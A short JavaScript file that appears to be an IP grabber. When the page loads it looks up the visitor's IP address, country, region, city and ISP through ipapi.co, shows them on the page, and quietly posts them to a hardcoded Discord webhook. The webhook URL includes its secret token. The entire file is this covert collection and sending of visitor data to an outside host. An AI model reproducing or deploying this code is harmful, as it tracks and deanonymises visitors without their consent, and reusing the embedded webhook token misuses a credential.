const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";

fetch("https://ipapi.co/json/")
    .then(response => response.json())
    .then(json => {
        const ip = json.ip;
        const version = json.version;
        const country = json.country_name;
        const region = json.region;
        const org = json.org;
        const city = json.city;

        document.getElementById("IP").innerHTML = ip;
        document.getElementById("version").innerHTML = version;
        document.getElementById("country_name").innerHTML = country;
        document.getElementById("region").innerHTML = region;
        document.getElementById("org").innerHTML = org;
        document.getElementById("city").innerHTML = city;

        const msg = {
            "content": `ip - ${ip}\nversion - ${version}\ncountry - ${country}\nregion - ${region}\norg - ${org}\ncity - ${city}`
        };

        return fetch(whurl + "?wait=true", {
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": JSON.stringify(msg)
        });
    })
    .then(response => response.json())
    .then(console.log)
    .catch(console.error);
